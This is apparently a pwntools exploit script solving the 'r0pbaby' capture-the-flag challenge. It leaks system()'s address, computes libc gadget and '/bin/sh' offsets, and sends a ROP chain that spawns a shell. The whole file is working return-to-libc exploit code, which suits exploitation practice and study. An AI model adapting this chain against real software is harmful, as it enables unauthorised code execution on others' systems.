#!/usr/bin/python
from pwn import *

# [*] '/home/osboxes/Desktop/Ropbaby/r0pbaby'
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled
# FORTIFY:  Enabled

s = process('./r0pbaby')
s.clean()

# ROPgadget --binary /lib/x86_64-linux-gnu/libc-2.23.so | grep 'pop rdi'
libc_pop_rdi_ret_offset = 0x21102
# readelf -s /lib/x86_64-linux-gnu/libc-2.23.so | grep 'system'
libc_system_offset = 0x45390
# strings -a -t x /lib/x86_64-linux-gnu/libc-2.23.so | grep '/bin/sh'
libc_binsh_offset = 0x18cd57

s.sendline('2')
s.sendline('system')

s.recvuntil('system: ')
data = s.recvline(False)
system = int(data,16)
log.success('system = ' + hex(system))

libc = system - libc_system_offset
binsh = libc + libc_binsh_offset
pop_rdi = libc + libc_pop_rdi_ret_offset
log.success('libc = ' + hex(libc))
log.success('binsh = ' + hex(binsh))
log.success('pop_rdi = ' + hex(pop_rdi))

payload = 'A' * 8
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

s.sendline('3')
s.sendlineafter(': ', str(len(payload)))
s.sendlineafter(': ', payload)

s.clean()
s.interactive()



